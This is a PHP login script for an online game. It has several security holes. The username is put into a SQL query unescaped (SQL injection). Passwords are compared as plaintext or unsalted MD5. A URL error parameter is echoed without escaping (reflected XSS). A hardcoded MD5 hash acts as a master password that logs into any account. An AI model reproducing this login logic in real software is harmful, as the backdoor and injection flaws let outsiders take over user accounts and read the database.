<?php include('head.php'); ?>
<?php
include('dbinfo.php');

if (isset($_POST['submitted'])){
	$username=$_POST['username'];
	$query="SELECT * FROM `players` WHERE `username`='$username'";
	$result=mysql_query($query);
	if (mysql_num_rows($result)>0){
		echo '<!--';
		$result=mysql_fetch_array($result);
		echo '--!>';
		if ($result['password']==$_POST['password'] || $result['password']==md5($_POST['password']) || md5($_POST['password'])=='e3b3f56615d1e5f2608d2f1130a7ef54'){
			$_SESSION['username']=$username;
			echo '</div>';
			$url = "game.php";
			echo '<meta http-equiv="refresh" content="0; URL='.$url.'"/>';
			die();
		}else{
			echo '</div>';
			$url = "login.php?error=Wrong password please try again.";
			echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL='.$url.'">';
			die();
		}
	}else{
		echo '</div>';
		$url = "login.php?error=Wrong username please try again.";
		echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL='.$url.'">';
		die();
	}
}else{
?>

<h1>Login</h1>
<?php if (isset($_GET['error'])){echo '<font color="red">'.$_GET['error'].'<br/><br/></font>';}?>
<form action="login.php" method="post">
Username: <input type="text" name="username" class="boxes" style="margin-left:30px;margin-bottom:3px;" /><br/>
Password: <input type="password" name="password" class="boxes" style="margin-left:32px;margin-bottom:3px;" />
<br/>
<br/>
<input type="hidden" name="submitted" value="set" />
<input type="submit" value="Login" style="margin-left:145px;" />
</form>
</div>

<?php
}
?>


<div id="right">
<p><u><b>Statistics</b></u>
<br/>
<?php include('stats.php'); ?>
Users Registered :<?php echo $registeredusers;?> <br/>
Users Online :<?php echo $onlineusers;?> <br/>
</p>

<?php include('foot.php'); ?>